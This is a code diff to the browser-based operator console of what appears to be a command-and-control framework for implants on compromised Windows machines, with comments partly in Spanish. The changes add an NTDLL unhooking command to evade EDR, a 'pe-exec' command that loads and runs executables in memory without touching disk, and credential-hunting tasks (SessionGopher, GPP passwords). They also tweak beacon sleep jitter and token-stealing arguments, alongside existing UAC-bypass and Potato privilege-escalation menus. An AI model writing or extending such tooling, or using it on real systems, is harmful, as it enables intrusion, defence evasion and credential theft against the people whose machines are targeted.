@@ -136,7 +136,7 @@ tr.selected td{background:rgba(0,212,255,.06)}
 #console-header{padding:4px 10px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--bg3)}
 #console-title{font-family:var(--font-mono);font-size:11px;color:var(--accent)}
 #console-output{flex:1;overflow:auto;padding:8px 10px;font-family:var(--font-mono);font-size:11px;line-height:1.5}
-.console-line{display:flex;gap:8px;margin-bottom:3px;min-width:0}
+.console-line{display:flex;gap:8px;margin-bottom:3px;min-width:0;content-visibility:auto;contain-intrinsic-size:auto 20px}
 .console-ts{color:var(--text3);flex-shrink:0;font-size:10px;padding-top:1px}
 .console-prompt{color:var(--accent);flex-shrink:0}
 .console-cmd{color:var(--text2)}
@@ -4203,7 +4203,7 @@ function closeProcessTab() { closePSSession(psAgentId); }
 // ── Sleep mode label helper ────────────────────────────────────────────────────
 function sleepModeLabel(sec, jitter) {
   sec = sec || 60; jitter = jitter || 0;
-  if (sec <= 2  && jitter === 0)  return '⚡ Interactive';
+  if (sec <= 2  && jitter <= 10)  return '⚡ Interactive';
   if (sec <= 60 && jitter <= 25)  return '🔄 Standard';
   if (sec >= 3000 && sec < 7200)  return '🕐 Long-Haul';
   if (sec >= 7200)                return '🌙 Night Mode';
@@ -4215,7 +4215,7 @@ function sleepContextMenu(e, agentId, currentSec, currentJitter) {
   e.stopPropagation();
   showCtxMenu(e, [
     {_header: `Sleep: ${currentSec}s ±${currentJitter}%`},
-    {label:'⚡  Interactive  — 1s ±0%',        action:{fn:'setSleep', id:agentId, sec:1,    jitter:0}},
+    {label:'⚡  Interactive  — 1s ±10%',       action:{fn:'setSleep', id:agentId, sec:1,    jitter:10}},
     {label:'🔄  Standard     — 30s ±20%',       action:{fn:'setSleep', id:agentId, sec:30,   jitter:20}},
     {label:'🕐  Long-Haul   — 1h ±25%',         action:{fn:'setSleep', id:agentId, sec:3600, jitter:25}},
     {label:'🌙  Night Mode  — 4h ±30%',          action:{fn:'setSleep', id:agentId, sec:14400,jitter:30}},
@@ -4470,8 +4470,9 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'UAC bypass (fodhelper)…',   action:{fn:'quickPrivesc', id, act:'fodhelper'}},
       null,
-      {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',  args:''}},
-      {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK', args:''}},
+      {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',    args:''}},
+      {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK',  args:''}},
+      {label:'🔓 NTDLL Unhook',            action:{fn:'selectAndTask', id, type:'NTDLL_UNHOOK', args:''}},
       null,
       {label:'🥔  SeImpersonate → SYSTEM (Potato)…', action:{fn:'potatoPrivesc', id}},
     ]},
@@ -4565,7 +4566,7 @@ function agentContextMenu(e, agentId) {
     ]},
     null,
     {_sub:'💤  Sleep', items:[
-      {label:'⚡  Interactive  — 1s ±0%',        action:{fn:'setSleep', id, sec:1,    jitter:0}},
+      {label:'⚡  Interactive  — 1s ±10%',       action:{fn:'setSleep', id, sec:1,    jitter:10}},
       {label:'🔄  Standard     — 30s ±20%',       action:{fn:'setSleep', id, sec:30,   jitter:20}},
       {label:'🕐  Long-Haul   — 1h ±25%',        action:{fn:'setSleep', id, sec:3600, jitter:25}},
       {label:'🌙  Night Mode  — 4h ±30%',         action:{fn:'setSleep', id, sec:14400,jitter:30}},
@@ -4604,48 +4605,54 @@ function processContextMenu(e, pid, name) {
 
 // ── PS output smart renderer ───────────────────────────────────────────────────
 function tryRenderProcessTable(output) {
-  const lines = output.split('\n');
-  if (lines.length < 3) return null;
-  // Expect header line with PID column
+  const lines = output.split('\n').filter(l => l.trim());
+  if (lines.length < 2) return null;
   const hdr = lines[0].trim().toUpperCase();
-  if (!hdr.startsWith('PID')) return null;
+
+  // Detect format: PID-first text table (Go/Nim) OR CSV from tasklist /FO CSV
+  const isCsv = !hdr.startsWith('PID') && lines[0].trim().startsWith('"');
+  if (!hdr.startsWith('PID') && !isCsv) return null;
 
   const wrap = document.createElement('div');
   wrap.style.overflowX = 'auto';
   const tbl = document.createElement('table');
   tbl.className = 'ps-table';
 
-  // Header
   const thead = document.createElement('thead');
   const hrow = document.createElement('tr');
   ['PID','Image / Name'].forEach(col => {
-    const th = document.createElement('th');
-    th.textContent = col;
-    hrow.appendChild(th);
+    const th = document.createElement('th'); th.textContent = col; hrow.appendChild(th);
   });
   thead.appendChild(hrow);
   tbl.appendChild(thead);
 
-  // Rows — skip header and separator lines
   const tbody = document.createElement('tbody');
   let count = 0;
-  for (let i = 2; i < lines.length; i++) {
+  const startIdx = isCsv ? 0 : 2;  // CSV has no header; text table has 2 header rows
+
+  for (let i = startIdx; i < lines.length; i++) {
     const l = lines[i].trim();
     if (!l) continue;
-    // Format: "PID       IMAGE"  (PID is left-padded in 8 chars)
-    const m = l.match(/^(\d+)\s+(.+)$/);
-    if (!m) continue;
-    const [, pid, name] = m;
+    let pid = '', name = '';
+    if (isCsv) {
+      // Format: "Image Name","PID","Session Name","Session#","Mem Usage"
+      const parts = l.split('","');
+      if (parts.length < 2) continue;
+      name = parts[0].replace(/^"/, '');
+      pid  = parts[1].replace(/"/g, '');
+      if (!/^\d+$/.test(pid)) continue;
+    } else {
+      // Format: "PID       IMAGE / NAME  SECURITY"
+      const m = l.match(/^(\d+)\s+(.+?)(?:\s+\[.+\])?\s*$/);
+      if (!m) continue;
+      pid = m[1]; name = m[2].trim();
+    }
     const tr = document.createElement('tr');
     tr.setAttribute('oncontextmenu', `processContextMenu(event,${pid},'${name.replace(/'/g,"\\'")}');return false`);
     tr.title = 'Right-click for actions';
-    const tdPid = document.createElement('td');
-    tdPid.className = 'mono';
-    tdPid.textContent = pid;
-    const tdName = document.createElement('td');
-    tdName.textContent = name;
-    tr.appendChild(tdPid);
-    tr.appendChild(tdName);
+    const tdPid = document.createElement('td'); tdPid.className = 'mono'; tdPid.textContent = pid;
+    const tdName = document.createElement('td'); tdName.textContent = name;
+    tr.appendChild(tdPid); tr.appendChild(tdName);
     tbody.appendChild(tr);
     count++;
   }
@@ -4696,6 +4703,8 @@ window.onload = () => {
     document.getElementById('login-url').value   = window.location.origin;
     document.getElementById('login-token').value = window.__GUI_TOKEN__ || '';
   }
+  // Auto-login when the GUI token is embedded (local GUI mode)
+  if (window.__GUI_TOKEN__ && !TOKEN) { setTimeout(doLogin, 100); }
 
   // Global drag/pan listeners for agent graph
   document.addEventListener('mousemove', e => {
@@ -7337,6 +7346,7 @@ const AC_COMMANDS = [
   ['thread-hijack','thread-hijack <pid> <sc.bin>  — section map + parchear RIP de thread (sin CreateRemoteThread)'],
   ['hook-check','hook-check  — escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)'],
   ['hw-bp-check','hw-bp-check  — detectar hardware breakpoints activos (DR0–DR3)'],
+  ['pe-exec','pe-exec <file.exe> [args]  — cargar y ejecutar PE nativo en memoria sin tocar disco'],
   ['mem-fluctuate','mem-fluctuate start [secs] | stop  — XOR-muta buffers internos del agente contra escaneos periódicos'],
   ['encode-uuid','encode-uuid <sc.bin>  — genera código C con UUIDs (UuidFromStringA) listo para compilar'],
   ['token','token whoami|steal <pid>|make <u> <p>|drop'],
@@ -7439,7 +7449,7 @@ const AC_WIN_ONLY = new Set([
   'screenshot',
   'inject','inject-apc','thread-hijack','forkrun',
   'dotnet-asm','dotnet-exec','clrstomp','bof','stage2',
-  'hook-check','hw-bp-check','mem-fluctuate','mem-fluctuate start','mem-fluctuate stop',
+  'hook-check','hw-bp-check','pe-exec','mem-fluctuate','mem-fluctuate start','mem-fluctuate stop',
   'encode-uuid',
   'token','token whoami','token steal','token make','token drop',
   'make-token','steal-token','rev2self',
@@ -9808,6 +9818,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'gpp': case 'gpp-passwords': case 'gpppw': taskType='GPP_PASSWORDS'; break;
     case 'wifi': case 'wifi-creds': case 'wificreds': taskType='WIFI_CREDS'; break;
     case 'sessioncreds': case 'session-creds': case 'screds': taskType='SESSION_CREDS'; break;
+    case 'session-gopher': case 'sessiongopher': case 'sgopher': taskType='SESSION_GOPHER'; break;
+    case 'gpp-hunt': case 'gpphunt': taskType='GPP_HUNT'; break;
     case 'search': {
       // search [root] <pattern>   e.g. search *.kdbx  or  search C:\Users *.pfx
       taskType = 'SEARCH'; taskArgs = args; break;
@@ -10059,7 +10071,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         taskArgs = 'rm ' + cp[1];
       } else if (cp.length >= 2) {
         taskType = 'COM_HIJACK';
-        taskArgs = JSON.stringify({clsid: cp[0], dll: cp[1]});
+        taskArgs = JSON.stringify({clsid: cp[0], path: cp[1]});
       } else {
         addConsoleOutput(
           'uso: com-hijack <CLSID> <dll.dll>\n     com-hijack rm <CLSID>\n\n' +
@@ -10309,9 +10321,28 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       taskType = 'HOOK_CHECK';
       break;
 
+    case 'ntdll-unhook': case 'unhook-ntdll': case 'unhook':
+      taskType = 'NTDLL_UNHOOK';
+      break;
+
     case 'hw-bp-check':
       taskType = 'HW_BP_CHECK';
       break;
+
+    case 'pe-exec': case 'exec-pe': {
+      const peparts = args.trim().split(' ');
+      const peFile  = peparts[0];
+      const peArgs  = peparts.slice(1).join(' ');
+      if (!peFile) { addConsoleOutput('usage: pe-exec &lt;file.exe&gt; [args]', '', null); return; }
+      addConsoleOutput(`[*] Fetching ${peFile}…`, '', null);
+      try {
+        const sc = await fetchSCFile(peFile);
+        payload  = u8ToB64(sc);
+        taskType = 'EXEC_PE';
+        taskArgs = peArgs;
+      } catch(e) { addConsoleOutput('', 'pe-exec error: '+e.message, null); return; }
+      break;
+    }
 
     case 'mem-fluctuate': {
       const mfparts = args.trim().split(' ');
@@ -10376,13 +10407,13 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
     case 'token-store': {
       const [sub,...rest2] = args.split(' ');
-      if (sub==='steal') { taskType='TOKEN_STORE_STEAL'; taskArgs=rest2[0]||''; }
+      if (sub==='steal') { taskType='TOKEN_STORE_STEAL'; taskArgs=JSON.stringify({pid:parseInt(rest2[0],10)||0}); }
       else if (sub==='use') {
         if (!rest2[0]) { addConsoleOutput('uso: token-store use <id>', '', null); return; }
-        taskType='TOKEN_STORE_USE'; taskArgs=rest2[0];
+        taskType='TOKEN_STORE_USE'; taskArgs=JSON.stringify({id:parseInt(rest2[0],10)||1});
       }
       else if (sub==='show' || sub==='list') { taskType='TOKEN_STORE_SHOW'; }
-      else if (sub==='remove') { taskType='TOKEN_STORE_REMOVE'; taskArgs=rest2[0]||''; }
+      else if (sub==='remove') { taskType='TOKEN_STORE_REMOVE'; taskArgs=JSON.stringify({id:parseInt(rest2[0],10)||1}); }
       else if (sub==='clear') { taskType='TOKEN_STORE_CLEAR'; }
       break;
     }
